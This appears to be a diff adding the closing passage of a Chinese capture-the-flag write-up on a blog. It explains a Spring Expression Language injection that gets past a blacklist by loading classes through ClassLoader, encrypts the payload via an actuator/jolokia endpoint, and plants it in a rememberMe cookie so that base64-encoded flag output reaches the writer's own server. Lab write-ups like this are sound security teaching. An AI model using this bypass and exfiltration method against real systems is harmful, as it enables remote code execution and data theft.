+<p>现在解释下第三个args<br>因为黑名单的限制，我们选择字符串拼接的方式绕过黑名单的检测，这里的黑名单比出题人提供的资料里增加了forName和getClass,这俩的作用是加载类,这里我们用ClassLoader代替，于是就有<em>ClassLoader.getSystemClassLoader().loadClass()</em>，为了转换为SpEL的形式，我们需要<em>#{T(ClassLoader).getSystemClassLoader().loadClass()}</em>  </p>
+<p>(照搬出题人原话)<br>关于invoke：<br>在Java中,方法可以当做Method类的一个对象来看待。<br><em>a.print(b)==print.invoke(a,b)</em><br>print是个变量，定义为<em>Method print=A.class.getMethod(“print);</em><br>就是获取类A里面的这个print方法  </p>
+<p>flag在根目录下所以直接cat flag，base64编码是因为某些字符你不编码的话最后显示不出来<br>先进行加密，因为之后网站会对rememberMe的值进行自动解密，将以上payload以JSON形式post至<a href="http://ezspel.hgame.wz22.cc/actuator/jolokia" target="_blank" rel="noopener">http://ezspel.hgame.wz22.cc/actuator/jolokia</a><br>此时vps是没有接收到数据的，因为现在只是对数据进行了一个加密处理，然后我们看一下response<br><img src="wp4_img/6.png" alt=""><br>value所指的就是加密后的数据，我们把它放进cookie中的rememberMe中,然后直接GET访问<a href="http://ezspel.hgame.wz22.cc/" target="_blank" rel="noopener">http://ezspel.hgame.wz22.cc/</a><br>就好，在我们的服务器上查看apache日志就可以看见base64编码后的flag</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/x9un">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+    <script type="text/javascript">
+       (function() {
+           if (typeof LivereTower === 'function') { return; }
+
+           var j, d = document.getElementById('lv-container');
+
+           d.setAttribute('data-id','city');
+           d.setAttribute('data-uid' , 'MTAyMC80ODAwNy8yNDUwNA==');
+
+           j = document.createElement('script');
+           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+           j.async = true;
+
+           d.appendChild(j);
+       })();
+    </script>
+    <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+</html>
